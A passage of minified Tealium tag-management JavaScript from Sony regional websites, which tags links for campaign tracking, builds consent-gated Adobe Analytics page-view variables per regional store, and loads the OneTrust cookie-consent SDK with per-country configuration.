e=0;jQuery(".st-item").each((function(){e+=1,$(this).data("banner_index",e)})),jQuery("[data-lv2='only_sony_carousel']").next().find('a[href*="latest"],a[href*="THELATEST"]').each((function(){null===jQuery(this).attr("href").match(/(latest_+[0-9]_|thelatest+[0-9]span_+[0-9]|[0-9]:HOMEPAGE_)/gi)&&(jQuery(this).closest(".st-item").data("banner_index")+"").length>0&&jQuery(this).attr("href",jQuery(this).attr("href").replace("cpint=","cpint="+jQuery(this).closest(".st-item").data("banner_index")+":"))}))}))}catch(e){"undefined"!=typeof jQuery&&jQuery("body").trigger("customError",["Latest Tracking code",document.URL,e])}}(),function(){if("undefined"!=typeof jQuery){var e=jQuery(".rp-slide"),t=0,a="";jQuery(".rp-container a:not([href*='WHATSHOT_'])").each((function(){t=0;for(var o=0;o<e.length;o++)jQuery(this).parents(".rp-slide").is(jQuery(e[o]))&&(t=o+1);a=jQuery(this).find(".visuallyhidden").length>0?0!==t?"hot_"+t+"_"+jQuery(this).find(".visuallyhidden").data("name"):"hot_1_"+jQuery(this).find(".visuallyhidden").data("name"):0!==t?"hot_"+t:"hot_1_",void 0!==jQuery(this).find(".visuallyhidden").data("flag")&&jQuery(this).find(".visuallyhidden").length>0&&(a+="_"+jQuery(this).find(".visuallyhidden").data("flag")),-1===this.href.toLowerCase().indexOf("cpint")&&-1===this.href.toLowerCase().indexOf("javascript:void(0)")&&(-1===this.href.indexOf("?")?this.href=this.href+"?cpint="+a:this.href=this.href+"&cpint="+a)})),jQuery(".rp-container a[href*='WHATSHOT_']").each((function(){t=0;for(var a=0;a<e.length;a++)jQuery(this).parents(".rp-slide").is(jQuery(e[a]))&&(t=a+1);0!==t&&this.href.toLowerCase().indexOf("cpint")>-1&&(this.href=this.href.replace("WHATSHOT_","WHATSHOT_"+t+"_"))})),jQuery.event.trigger({type:"hotproducts_tagged",message:"hotproducts_tagged",time:new Date})}}(),g(!0,!0,!0,!0),p()):"undefined"!=typeof jQuery&&(g(!1,!1,!1,!0),_(),"client"!==e&&jQuery(window).on("resize scrollHasStopped ready",_)),"client"!==e&&(_bsq.aa.all_headerFooterClick(),_bsq.aa.all_navigationClick(l),_bsq.aa.module_interactionListerner(),_bsq.aa.all_ProductAddToFavorites(),_bsq.aa.trackViewSwitchButtonClick(),_bsq.aa.gwt_euChatInteraction(),_bsq.aa.gwt_hkChatInteraction(),c.indexOf("glb:search")>-1&&(_bsq.aa.search_trackClicks(),_bsq.aa.search_trackLoadMoreClicks()),"undefined"!=typeof utag_data&&void 0!==utag_data.aaCountry&&/^(US|CA)$/gi.test(utag_data.aaCountry)&&-1!==document.URL.toLowerCase().indexOf("/buy")?"transition"===l&&_bsq.aa.transition_GlobalTransitionDealerClick():"undefined"!=typeof utag_data&&void 0!==utag_data.aaCountry&&/^(US|CA)$/gi.test(utag_data.aaCountry)?(l.toLowerCase().indexOf("where to buy")>-1||l.toLowerCase().indexOf("transition")>-1)&&_bsq.aa.regional_USCADealerClick():"transition"===l&&(_bsq.aa.transition_GlobalTransitionDealerClick(),_bsq.aa.transition_EUMapDealerClick()),"oof"===l&&(_bsq.aa.pdp_userfeedback(),_bsq.aa.oof_trackSocialLinkClicks(c,l),_bsq.aa.transition_GlobalTransitionDealerClick(),_bsq.aa.oof_DealerClick()),l.toLowerCase().indexOf("sony square nyc showroom")>-1&&_bsq.aa.oof_trackSocialLinkClicks(c,l),"pdp"===l&&(_bsq.aa.pdp_trackSocialLinkClicks(c,l),_bsq.aa.pdp_userfeedback()),void 0===l||"reviews_listing"!==l&&"pdp"!==l||_bsq.aa.pdp_review_submit(),"glb:dealer locator:search"===c&&_bsq.aa.transition_EUMapDealerClick(),"gallery"!==l&&"subgallery"!==l&&"product accessories"!==l||_bsq.aa.gallery_trackAccessoryFinderTyped()),"set"===_bsq.utils.docCookies.getItem(_bsq.aa.knowYourCustomerCookie)&&(t.aaEvents.push("event101"),_bsq.utils.docCookies.setItem(_bsq.aa.knowYourCustomerCookie,"")),t},_bsq.aa.prepareAAVariables=function(e,t){if(_bsq.aa.clear_aaUtagObj(e),u=_bsq.aa.setDatalayerObject(t),function(){if(o=new Array("pdp-slideshow","pdp-product_summary","pdp-product_details","pdp-reviews_awards","pdp-dynamic_related_products","pdp-utility_links","pdp-tech_specs","all_electronics","pdp_reviews-review_navigation","pdp_reviews-review_listing","pdp_reviews-reviewer_profile","pdp-reviews_awards_v2","favorites-products","pdp-recently_viewed","pdp_reviews-review_summary","category-subnavigation","error-description","eco-tv-legislation","printable-eco-label","only_sony_carousel","locale-selector","pdp-feedback","pdp_highlights","pdp_local-banner","transition_sku-selection","transition_retailer-links","transition_dealer-locator","review_disclaimer"),"undefined"!=typeof jQuery){jQuery(".moduleTags[data-mastername=''][data-lv1='informational'][data-lv2='pdp_slideshow']").attr("data-mastername","pdp-slideshow"),jQuery(".moduleTags[data-mastername=''][data-lv1='informational'][data-lv2='product_summary']").attr("data-mastername","pdp-product_summary"),jQuery(".moduleTags[data-mastername=''][data-lv1='informational'][data-lv2='details']").attr("data-mastername","pdp-product_details"),jQuery(".moduleTags[data-mastername=''][data-lv1='informational'][data-lv2='reviews_awards']").attr("data-mastername","pdp-reviews_awards"),jQuery(".moduleTags[data-mastername=''][data-lv1='gallery'][data-lv2='related_products_dynamic']").attr("data-mastername","pdp-dynamic_related_products"),jQuery(".moduleTags[data-mastername=''][data-lv1='informational'][data-lv2='utility_links_pdp']").attr("data-mastername","pdp-utility_links"),jQuery(".moduleTags[data-mastername=''][data-lv1='informational'][data-lv2='specs']").attr("data-mastername","pdp-tech_specs"),jQuery(".moduleTags[data-mastername=''][data-lv1='all_electronics'][data-lv2='all_electronics']").attr("data-mastername","all_electronics"),jQuery(".moduleTags[data-mastername=''][data-lv1='informational'][data-lv2='product_review_navigation']").attr("data-mastername","pdp_reviews-review_navigation"),jQuery(".moduleTags[data-mastername=''][data-lv1='review'][data-lv2='listing']").attr("data-mastername","pdp_reviews-review_listing"),jQuery(".moduleTags[data-mastername=''][data-lv1='review'][data-lv2='reviewer_profile']").attr("data-mastername","pdp_reviews-reviewer_profile"),jQuery(".moduleTags[data-mastername=''][data-lv1='informational'][data-lv2='reviews_awards_v2']").attr("data-mastername","pdp-reviews_awards_v2"),jQuery(".moduleTags[data-mastername=''][data-lv1='gallery'][data-lv2='my_favorites']").attr("data-mastername","favorites-products"),jQuery(".moduleTags[data-mastername=''][data-lv1='navigation'][data-lv2='recently_viewed']").attr("data-mastername","pdp-recently_viewed"),jQuery(".moduleTags[data-mastername=''][data-lv1='review'][data-lv2='summary']").attr("data-mastername","pdp_reviews-review_summary"),jQuery(".moduleTags[data-mastername=''][data-lv1='navigation'][data-lv2='sub_navigation']").attr("data-mastername","category-subnavigation"),jQuery(".moduleTags[data-mastername=''][data-lv1='error'][data-lv2='error']").attr("data-mastername","error-description"),jQuery(".moduleTags[data-mastername=''][data-lv1='informational'][data-lv2='tv legislation']").attr("data-mastername","eco-tv-legislation"),jQuery(".moduleTags[data-mastername=''][data-lv1='informational'][data-lv2='printable-eco-label']").attr("data-mastername","printable-eco-label"),jQuery(".moduleTags[data-mastername=''][data-lv1='secondary'][data-lv2='only_sony_carousel']").attr("data-mastername","only_sony_carousel"),jQuery(".moduleTags[data-mastername=''][data-lv1='navigation'][data-lv2='locale-selector']").attr("data-mastername","locale-selector"),jQuery(".moduleTags[data-mastername=''][data-lv1='informational'][data-lv2='feedback']").attr("data-mastername","pdp-feedback"),jQuery(".moduleTags[data-mastername=''][data-lv1='informational'][data-lv2='highlights']").attr("data-mastername","pdp_highlights"),jQuery(".moduleTags[data-mastername=''][data-lv1='informational'][data-lv2='local_banner']").attr("data-mastername","pdp_local-banner"),jQuery(".moduleTags[data-mastername=''][data-lv1='informational'][data-lv2='sku-selection']").attr("data-mastername","transition_sku-selection"),jQuery(".moduleTags[data-mastername=''][data-lv1='informational'][data-lv2='product_details-buy_online']").attr("data-mastername","transition_retailer-links"),jQuery(".moduleTags[data-name=''][data-lv1='informational'][data-lv2='dealer-locator']").length>0&&/sony\.co\.uk/gi.test(document.URL)?jQuery(".moduleTags[data-name=''][data-lv1='informational'][data-lv2='dealer-locator']").remove():jQuery(".moduleTags[data-name=''][data-lv1='informational'][data-lv2='dealer-locator']").attr("data-mastername","transition_dealer-locator"),jQuery(".moduleTags[data-mastername=''][data-lv1='review'][data-lv2='disclaimer']").attr("data-mastername","review_disclaimer");try{if(void 0!==u&&void 0!==u.page&&"home"===u.page.pageTemplate&&jQuery(".moduleTags[data-lv1='primary'][data-lv2='tout'] ~ section.primary-tout a").length>0&&~jQuery(".moduleTags[data-lv1='primary'][data-lv2='tout'] ~ section.primary-tout a").attr("href").indexOf("cpint=")){var e=jQuery(".moduleTags[data-lv1='primary'][data-lv2='tout'] ~ section.primary-tout a").attr("href"),t=e.substr(e.indexOf("cpint=")+6,e.length-(e.indexOf("cpint=")+6));jQuery(".moduleTags[data-lv1='primary'][data-lv2='tout']").attr("data-mastername",t),o.push(t)}}catch(e){}}}(),utag_data=function(e,t,o){return a=new Date,void 0===e&&(e="server"),null!==e&&""!==e&&"client"===e||(e="server"),"client"===e&&(utag_data=_bsq.aa.clear_aaUtagObj(e),"undefined"!=typeof sgwn&&sgwn.clearVars()),t.aaEvents=[],t.aaNavigationLinkCookie=_bsq.utils.docCookies.getItem(_bsq.aa.navigationLinkCookieName),t.aaPageURL=_bsq.utils.all_maskPIIData(document.URL),t.aaPageURLExclParams=window.location.protocol+"//"+window.location.host+window.location.pathname,t.aaPageName=o.page.section+":"+sony.digitalData.page.name||"",t.aaCountry=o.page.country||"",t.aaLanguage=o.page.language||"",t.aaSiteSection=o.page.section||"",t.aaPageTemplate=o.page.pageTemplate||"",t.aaDomain=location.hostname||"",t.aaSEOTitle=document.title||"",t.aaUserID=_bsq.utils.all_maskPIIData(o.user.id||""),""===t.aaUserID&&(t.aaUserID=_bsq.utils.getQueryParameter(location.href.toLowerCase(),"ccid")),t.aaReferrer=_bsq.utils.all_maskPIIData(document.referrer||""),"client"===e&&""!==d&&""===t.aaReferrer&&(t.aaReferrer=_bsq.utils.all_maskPIIData(d)),t.aaAccount=_bsq.aa.all_getRSID(o.page.country.toUpperCase()),t.aaCurrencyCode=o.product.currency||"",t.aaPageOrigin=e,""!==_bsq.utils.getQueryParameter(document.URL,"source")&&_bsq.utils.getQueryParameter(document.URL,"source")!=o.page.source?t.aaTrafficSource=_bsq.utils.getQueryParameter(document.URL,"source")||"":t.aaTrafficSource=o.page.source||"",t.aaModules=_bsq.aa.all_countModules(),t.aaDeviceType=_bsq.utils.getDeviceType(),t.aaPlatform=/(swt|gwt|gwx)/gi.test(utag_data.website_platform.split(":")[1]||"")?utag_data.website_platform.split(":")[1]:"other",t.aaModulesLoaded=_bsq.utils.docStorage.getItem(_bsq.aa.loadedElementsLocalStorageKey),t.aaModulesViewed=_bsq.utils.docStorage.getItem(_bsq.aa.seenElementsLocalStorageKey),_bsq.utils.docStorage.setItem(_bsq.aa.loadedElementsLocalStorageKey,""),_bsq.utils.docStorage.setItem(_bsq.aa.seenElementsLocalStorageKey,""),t.aaFilters=_bsq.utils.docCookies.getItem(_bsq.aa.filtersCookieName),_bsq.utils.docCookies.setItem(_bsq.aa.filtersCookieName,""),""!==_bsq.utils.docCookies.getItem(_bsq.aa.sortingCookieName)&&(void 0!==t.aaFilters?t.aaFilters+=" > "+_bsq.utils.docCookies.getItem(_bsq.aa.sortingCookieName):t.aaFilters=" > "+_bsq.utils.docCookies.getItem(_bsq.aa.sortingCookieName),_bsq.utils.docCookies.setItem(_bsq.aa.sortingCookieName,"")),_bsq.aa.all_overlayModule()&&t.aaEvents.push("event154"),d=document.URL,t}(e,utag_data,u),/^(global:(gwt|swt)|regional:(marketing|swt)|unknown)$/gi.test(t))utag_data=_bsq.aa.marketingAndSupportAdobeVariables(e,utag_data,u);else if(/^(regional:ecommerce)$/gi.test(t))switch(_bsq.aa.identifyStore().store){case"rustore":utag_data=_bsq.aa.regionalRUStoreAdobeVariables(e,utag_data,u);break;case"seastore":utag_data=_bsq.aa.marketingAndSupportAdobeVariables(e,utag_data,u);break;case"hkstore":utag_data=_bsq.aa.regionalHKStoreAdobeVariables(e,utag_data,u);break;case"csastore":utag_data=_bsq.aa.regionalCSAStoreAdobeVariables(e,utag_data,u);break;case"castore":utag_data=_bsq.aa.regionalCAStoreAdobeVariables(e,utag_data,u);break;case"anzstore":utag_data=_bsq.aa.regionalANZStoreAdobeVariables(e,utag_data,u);break;case"usstore":utag_data=_bsq.aa.regionalUSStoreAdobeVariables(e,utag_data,u);break;case"eustore":utag_data=_bsq.aa.regionalEUStoreAdobeVariables(e,utag_data,u);break;default:utag.DB("no store found")}"client"!==e&&window.addEventListener(_bsq.aa.unloadEventName,(function(t){_bsq.aa.sendUnloadMetrics(e)})),utag_data.aaPreviousPageName=_bsq.utils.docCookies.getItem("gpv_pn"),utag_data.aaPreviousPageURL=_bsq.utils.docCookies.getItem("gpv_v89"),utag_data.aaPreviousPageTemplate=_bsq.utils.docCookies.getItem("gpv_p7"),utag_data.aaPreviousUserID=_bsq.utils.docCookies.getItem("gpv_p1"),utag_data.aaPageViewedPercentage=_bsq.utils.docCookies.getItem("s_ppv").split(",")[1]||"",utag_data.aaInitialPixelsLoaded=parseInt(_bsq.utils.docCookies.getItem("s_ips"))||0,utag_data.aaTotalPixelsLoaded=parseInt(_bsq.utils.docCookies.getItem("s_tp"))||0;var i=parseInt(_bsq.utils.docCookies.getItem("s_ppv").split(",")[3])||0;return utag_data.aaAdditionalPixelsLoaded=i-utag_data.aaInitialPixelsLoaded<0?0:i-utag_data.aaInitialPixelsLoaded,utag_data.aaEvents.push("event1="+utag_data.aaAdditionalPixelsLoaded,"event2="+utag_data.aaInitialPixelsLoaded,"event3="+utag_data.aaTotalPixelsLoaded),utag_data}}}}catch(e){utag.DB(e)}},function(e,t){try{if(utag.runonce=utag.runonce||{},utag.runonce.ext=utag.runonce.ext||{},void 0===utag.runonce.ext[18]){utag.runonce.ext[18]=1;var a=utag_data.website_platform||void 0;window._bsq=window._bsq||{},_bsq.tags=_bsq.tags||{},_bsq.tags.initTagsVariables=function(){if("undefined"!=typeof _bsq&&void 0!==_bsq.data){var e=_bsq.data.initDataLayer(a)||{};if(getMostGranularProductID=function(e){var t=e.sku||[],a=e.supermodel||[],o=e.model||[];return 1===a.length?a[0]:1===o.length?o[0]:1===t.length?t[0]:""},void 0!==e){if(void 0!==e.page){var t=e.page;utag_data.tagsPageName=t.name||"",utag_data.tagsLanguage=t.language||"",utag_data.tagsSiteSection=t.section||"",utag_data.tagsPageTemplate=t.pageTemplate||"",utag_data.tagsPageTemplateRevision=t.template_revision||"",utag_data.tagsCountry=t.country||"",utag_data.tagsLocale=(t.language||"")+"_"+(t.country||""),utag_data.tagsPageTags=t.tags||{}}if(void 0!==e.gallery&&(utag_data.tagsGalleryItems=e.gallery.items||[]),void 0!==e.product){var o=e.product;utag_data.tagsSupermodel=o.supermodel||[],utag_data.tagsModel=o.model||[],utag_data.tagsProductPrice=o.price||"",utag_data.tagsCurrencyCode=o.currency||"",utag_data.tagsProductCategory1=o.category1||"",utag_data.tagsProductCategory2=o.category2||"",utag_data.tagsProductCategory3=o.category3||"",utag_data.tagsProductCategories=(o.category1||"")+"|"+(o.category2||"")+"|"+(o.category3||""),utag_data.tagsProductSkus=o.sku||[],utag_data.tagsProductSku=getMostGranularProductID(o),utag_data.tagsProductRatingAverage=o.ratingAverage||0,utag_data.tagsProductReviewsCount=o.reviewsCount||0}if(""===utag_data.tagsCurrencyCode&&(utag_data.tagsCurrencyCode=_bsq.aa.all_getRSID(utag_data.tagsCountry,"local_currency")||""),void 0!==e.transition){var i=e.transition;if(void 0!==i.selection){var r=i.selection;utag_data.tagsSelectedSku=r.sku||"",utag_data.tagsSelectedSupermodel=r.supermodel||"",utag_data.tagsSelectedModel=r.model||""}}if(void 0!==e.cart){var n=e.cart;utag_data.tagsCartId=n.id||[],utag_data.tagsCartQuantity=n.quantity||[],utag_data.tagsCartNetPrice=n.price||[],utag_data.tagsCartSellingPrice=n.sellingPrice||[],utag_data.tagsCartSku=n.sku||[],utag_data.tagsCartTotal=n.total||0}if(void 0!==e.order){var s=e.order;utag_data.tagsOrderId=s.id||"",utag_data.tagsOrderPrice=s.price||[],utag_data.tagsOrderSellingPrice=s.sellingPrice||[],utag_data.tagsOrderQuantity=s.quantity||[],utag_data.tagsOrderSku=s.sku||[],utag_data.tagsOrderTotal=s.total||0,utag_data.tagsOrderTax=s.tax||[],utag_data.tagsOrderOrigin=s.origin||""}if(void 0!==e.search){var d=e.search;utag_data.tagsSearchTerm=d.term||""}if(void 0!==e.user){var c=e.user;utag_data.tagsUserId=c.id||""}if(void 0!==e.registration){var l=e.registration;utag_data.tagsRegistrationPurchaseChannel=l.purchaseDealer,utag_data.tagsRegistrationProductModel=l.productModel}}utag_data.tagsPreviousPageName=utag_data["cp.gpv_pn"]||"",utag_data.tagsPreviousPageTemplate=utag_data["cp.gpv_p7"]||"",utag_data.tagsFilters=(utag_data["cp.fil_p31"]||"").replace(/=/gi,":").replace(/;/gi,",")}utag_data.tagsJSEmptyObject={},utag_data.tagsConstConversion="conversion"}}}catch(e){utag.DB(e)}},function(e,t){try{if(utag.runonce=utag.runonce||{},utag.runonce.ext=utag.runonce.ext||{},void 0===utag.runonce.ext[28]){utag.runonce.ext[28]=1;{var a=utag_data.website_platform||void 0,o=_bsq.data.initDataLayer(a)||{};window._bsq=window._bsq||{},_bsq.aa=_bsq.aa||{};var i=void 0,r=void 0;function n(e,t,o){window.setTimeout((function(){Date.now()-i<=r?void 0!==window.SonyAnalytics&&"object"==typeof(new window.SonyAnalytics).build()?_bsq.aa.trackPageView("server",a):window.setTimeout(n,250):_bsq.aa.trackPageView("server",a)}),250)}_bsq.aa.trackPageView=function(e,t,o){_bsq.tags.initTagsVariables(),"gwtConsentGiven"===utag_data.cs_event_name&&/(all|performance|adobe-marketing-cloud-analytics|C0002)/gi.test(utag_data.cs_consent_categories)?("unloadMetrics:true"===o&&_bsq.aa.sendUnloadMetrics("client"),/^global:gwx/gi.test(a)?utag.view(_bsq.aa.gwxAdobeVariables(e,utag_data),(function(){utag.DB("s.t() server call is sent: ["+e+"]")})):utag.view(_bsq.aa.prepareAAVariables(e,t),(function(){utag.DB("s.t() server call is sent: ["+e+"]")}))):(utag.view(utag_data,(function(){utag.DB("s.t() server call is sent: ["+e+"]")})),_bsq.utils.docCookies.removeItem("s_fid","/",_bsq.utils.getTLD()))},_bsq.aa.pageViewHandler=function(e){void 0===a||/^regional:ecommerce/gi.test(a)||/^global:(swt|gwx)/gi.test(a)?void 0!==a&&/^global:gwx$/gi.test(a)?window.sonyDataLayerReady?_bsq.aa.trackPageView("server",a):document.addEventListener("gwx-datalayer-ready",(function(e){_bsq.gwxPageViewTriggered||(_bsq.gwxPageViewTriggered=!0,_bsq.aa.trackPageView("server",a),/^transition$/gi.test(sony.digitalData.page.pageTemplate)&&document.addEventListener("page_state_updated",(function(e){_bsq.aa.trackPageView("client",a)})))})):void 0!==a&&"global:swt"===a?(!1===window._bsq.dtlReady?window.addEventListener("sptDatalayerReady",(function(e){utag.DB("=== > SPT DATA LAYER READY - VIA EVENT LISTENER"),_bsq.aa.trackPageView("server",a)})):(utag.DB("=== > SPT DATA LAYER READY "),_bsq.aa.trackPageView("server",a)),document.addEventListener("page_state_updated",_bsq.aa.spt_ajaxPageReload)):void 0!==a&&/^regional:ecommerce/gi.test(a)?"rustore"===_bsq.aa.identifyStore().store?void 0===window.SonyAnalytics?document.addEventListener("ru-store-pageview",(function(e){utag.DB("=== > RU STORE PAGE VIEW "+e),_bsq.aa.trackPageView("server",a)})):(utag.DB("=== > Analytics Object Ready "),_bsq.aa.trackPageView("server",a)):/(seastore|hkstore)/gi.test(_bsq.aa.identifyStore().store)?_bsq.aa.trackPageView("server",a):/(csastore)/gi.test(_bsq.aa.identifyStore().store)?(i=Date.now(),r=2e4,n(),document.addEventListener("checkoutStep",(function(e,t){_bsq.aa.trackPageView("client",a,e.detail.step)})),/(\.sony\.(com\.(ar|pa|mx|ec|pe|co)|cl)|(dev1--)?((pa|ar|cl|mx|ec|pe|co)sonyb2c|clsonyteleventas)\.myvtex\.com)/gi.test(window.location.hostname)&&document.addEventListener("page_state_updated",(function(e){_bsq.aa.trackPageView("client",a)}))):/(castore)/gi.test(_bsq.aa.identifyStore().store)||/(anzstore)/gi.test(_bsq.aa.identifyStore().store)?_bsq.aa.trackPageView("server",a):/(usstore)/gi.test(_bsq.aa.identifyStore().store)?document.addEventListener("page_state_updated",(function(e){_bsq.aa.trackPageView(e.detail.origin,a)})):/(eustore)/gi.test(_bsq.aa.identifyStore().store)?void 0!==window.baresquare_event_fired&&!0===window.baresquare_event_fired?(_bsq.aa.trackPageView("server",a),document.addEventListener("page_state_updated",(function(e){"client"===e.detail.origin&&_bsq.aa.trackPageView(e.detail.origin,a)}))):document.addEventListener("page_state_updated",(function(e){_bsq.aa.trackPageView(e.detail.origin,a)})):_bsq.aa.trackPageView("server",a):_bsq.aa.trackPageView("server",a):("interactive"===document.readyState||"complete"===document.readyState?(utag.DB("| =================== PAGE STATE IS "+document.readyState),_bsq.aa.trackPageView("server",a,e)):window.addEventListener("DOMContentLoaded",(function(t){_bsq.aa.trackPageView("server",a,e)})),void 0!==o&&void 0!==o.page&&/^(gallery|subgallery|product accessories)$/gi.test(o.page.pageTemplate)&&(jQuery(document).ajaxComplete((function(e,t,o){void 0!==o&&o.url.indexOf("module=gallery_tabs")>-1&&o.url.indexOf("view=")>-1&&_bsq.aa.trackPageView("client",a,"unloadMetrics:true")})),jQuery("[data-tab]").on("shown",(function(e){!0===_bsq.aa.pageLoaded&&_bsq.aa.trackPageView("client",a,"unloadMetrics:true")}))),/^regional:swt/gi.test(a)&&(/\/microsite\/support\/interactive/gi.test(window.location.pathname)||/27\.54\.47\.101:8085/gi.test(document.URL))&&document.addEventListener("page_state_updated",_bsq.aa.spt_spaPageReload))}}}}catch(e){utag.DB(e)}},function(e,t){try{if(utag.runonce=utag.runonce||{},utag.runonce.ext=utag.runonce.ext||{},void 0===utag.runonce.ext[37]){utag.runonce.ext[37]=1,window._bsq=window._bsq||{};var a=function(e,t,a="en"){!function(){var o="//cdn.cookielaw.org/scripttemplates/otSDKStub.js",i=document,r="script",n=i.createElement(r);n.src=o,n.setAttribute("data-domain-script",e+(t?"-test":"")),n.setAttribute("data-language",a),n.type="text/java"+r,n.async=!0,(o=i.getElementsByTagName(r)[0]).parentNode.insertBefore(n,o)}()};if((/((sony\.(at|be|bg|co\.uk|cz|de|dk|ee|es|eu|fi|fr|gr|hr|hu|ie|it|lt|lu|nl|no|pl|pt|ro|se|si|sk|com\.tr|co\.il))|sonylatvija\.com|sony-europe\.com)$/gi.test(window.location.host)||/preview-production-pdp\.sony\.ba/gi.test(window.location.host)||/^(sonyglobalsolutions-(dev65|stg65(a|b))\.adobecqms\.net)$/gi.test(window.location.host))&&!1===/(preview-production-pdp|uat-pdp)\.sony\.eu/gi.test(window.location.host)&&!1===_bsq.utils.isAgentPortal()){var o={SEU01:"essential",SEU02:"performance",SEU03:"functional",SEU04:"targeting, advertising or social media",SEU05:"first-party",SEU11:"support",SEU12:"sau-form",SEU13:"registration",SEU15:"gwt_recently_viewed_products_",SEU16:"gwt_favorite_products",V1:"adobe-marketing-cloud-media-optimizer-formerly-adlens",V2:"adobe-marketing-cloud-analytics",V3:"adobe-marketing-cloud-audience-manager",V4:"adobe-marketing-cloud-target",V6:"amazon",V7:"amazon-associates",V9:"bazaarvoice",V10:"cdnjs",V12:"doubleclick",V13:"doubleclick-bid-manager-formerly-invite-media",V15:"gomez",V16:"exelate",V17:"facebook",V18:"facebook-custom-audience",V19:"facebook-connect",V21:"google-adsense",V22:"google-adwords",V23:"google-analytics",V24:"googlefonts",V25:"google",V27:"google-tag-manager",V28:"hotjar",V29:"jsdelivr",V34:"nakanohito",V35:"optimizely",V36:"qualtrics",V37:"quantcast",V38:"igodigital",V40:"tealiumaudiencestream",V41:"tealium",V44:"treasure-data",V45:"userlocal",V46:"vimeo",V47:"whoson",V48:"youtube",V49:"support",V50:"sau-form",V51:"registration",V54:"gwt_favorite_products",V55:"gwt_recently_viewed_products_",V56:"mfilterit",V58:"snapchat",V59:"tiktok"},i={"sony.at":{id:"2441c6fc-79fe-4b91-8fb6-43c786bc7c3f",language:"de-at"},"sony.be":{id:"832bc293-bb18-4713-af4f-457d213bf680",language:"nl-be"},"sony.bg":{id:"1f20d421-c52d-48c8-b2be-a7c1054c74c6",language:"bg"},"sony.co.il":{id:"5a679973-424e-422e-b143-717f2877aef1",language:"he"},"sony.co.uk":{id:"0c3effb5-a3e0-4012-9095-8b4ffa82cd4e",language:"en"},"sony.com.tr":{id:"7f11a8b9-59ff-4f4d-8295-20e8db26987f",language:"tr"},"sony.cz":{id:"67d399a0-4321-4094-a072-d89fc7c459e5",language:"cs"},"sony.de":{id:"c3df86f1-04ce-4ab7-9093-a20d399fd755",language:"de"},"sony.dk":{id:"3e5ba170-4a50-4df6-87ff-e4e7548e1a6e",language:"da"},"sony.ee":{id:"8ccfa486-1b5b-4870-acc5-54f8bcef75f7",language:"et"},"sony.es":{id:"f4f22a41-f099-43ef-903a-9540a04611a9",language:"es"},"sony.fi":{id:"b6ff497c-b25a-4e6e-bf63-80f687d8482c",language:"fi"},"sony.fr":{id:"1cd47433-4432-44be-91a4-e67a1a6defcf",language:"fr"},"sony.gr":{id:"c2d402ec-60c1-4b2d-a8c3-c0431ea1d4e9",language:"el"},"sony.hr":{id:"3d8b9268-1ad6-48a8-b41a-f97c0c93a516",language:"hr"},"sony.hu":{id:"354bc0fb-e4a7-483d-8728-84b8f966f9a7",language:"hu"},"sony.ie":{id:"ff99f2a0-5ec8-433c-937d-60b6155adccd",language:"en-ie"},"sony.it":{id:"14477509-d533-4ab0-91fe-4d7cc31f3093",language:"it"},"sony.lt":{id:"847307e0-741e-47c1-ba16-f2333079269a",language:"lt"},"sony.lu":{id:"846dab79-8694-4b29-9237-2e0b1b9eb27a",language:"fr-lu"},"sony.nl":{id:"0fd38a06-0457-4f2c-9ca5-aee29a6ace27",language:"nl"},"sony.no":{id:"fd04552b-0b2f-4bd8-8c19-78d521355871",language:"no"},"sony.pl":{id:"bf7c1234-d017-40f4-a61d-06d8bec0d44b",language:"pl"},"sony.pt":{id:"6c34de03-04d3-4087-8924-3f214dde365b",language:"pt"},"sony.ro":{id:"88b875e9-a29e-43a5-8bfd-646a1beec176",language:"ro"},"sony.se":{id:"54086eae-50e8-4947-8610-fe7c87d51e75",language:"sv"},"sony.si":{id:"a0660943-15d2-4f9e-95f5-3dbe8e4940e2",language:"sl"},"sony.sk":{id:"30e24dfa-a703-4f41-8884-5fc60d1e93a9",language:"sk"},"sonylatvija.com":{id:"5a2574f1-002a-4d13-bfed-88498cb53c51",language:"lv"},"sony-europe.com":{id:"c3a84cd6-1247-4f34-9606-67335424e89c",language:"en"},"sony.eu":{id:"264390ed-4bc4-4dc2-bd12-30ed60cbc314",language:"en"}};if(/^(sonyglobalsolutions-(dev65|stg65a|stg65b)\.adobecqms\.net)$/gi.test(window.location.host))/dev65/gi.test(window.location.host)?a("b2fc87e1-fd81-4c6f-ac58-fdb015766d76",!1,"en"):/stg65a/gi.test(window.location.host)?a("e4ff8ea5-20ba-4400-aab8-7b05dacf48f5",!1,"en"):/stg65b/gi.test(window.location.host)&&a("334049c8-a323-4712-8607-6f6348306df6",!1,"en");else{var r=i[_bsq.utils.getTLD().substring(1)].id,n=document.getElementsByTagName("html")[0].getAttribute("lang"),s=i[_bsq.utils.getTLD().substring(1)].language,d=_bsq.utils.getTLD().substring(1).split(".")[1];/(be|lu|ie)/gi.test(d)&&(s=(s="undefined"!=typeof sony&&void 0!==sony.digitalData&&void 0!==sony.digitalData.page&&void 0!==sony.digitalData.page.language?sony.digitalData.page.language:n)+"-"+d),a(r,/preview|uat/gi.test(window.location.host),s)}window.OptanonWrapper=function(){document.cookie.indexOf("OptanonAlertBoxClosed")>-1&&function(e){utag_data.cs_consent_categories=e.map((function(e){return/\.sony\.(de|fr|it|lu)/gi.test(window.location.host)&&/SEU(02|03|04|05|11|12|13|15|16)/gi.test(e)?void 0:/(SEU15|V55)/gi.test(e)?o[e]&&"undefined"!=typeof sony&&void 0!==sony.digitalData&&void 0!==sony.digitalData.page?o[e]+sony.digitalData.page.language+"_"+sony.digitalData.page.country:e:o[e]?o[e]:e})).filter((function(e){return!!e})).join(","),utag.DB("**********    CONSENT CONFIGURATION ************"),utag.DB(utag_data.cs_consent_categories);var t=/(SEU(02|04|05|11|12|13|15|16))|(V(1|2|3|4|5|6|7|8|9|11|12|13|14|15|16|17|18|19|21|22|23|25|26|28|31|32|33|34|35|36|37|38|40|42|43|44|45|47|49|50|51|52|54|55|56|57|58|59),)/gi.test(window.OptanonActiveGroups)?"consent_given":"consent_declined";"consent_given"===t&&(utag_data.cs_event_name="gwtConsentGiven");var a=new CustomEvent(t,{detail:{categories:utag_data.cs_consent_categories}});document.dispatchEvent(a),_bsq.aa.pageViewHandler()}(window.OptanonActiveGroups.slice(1,-1).split(","))}}else 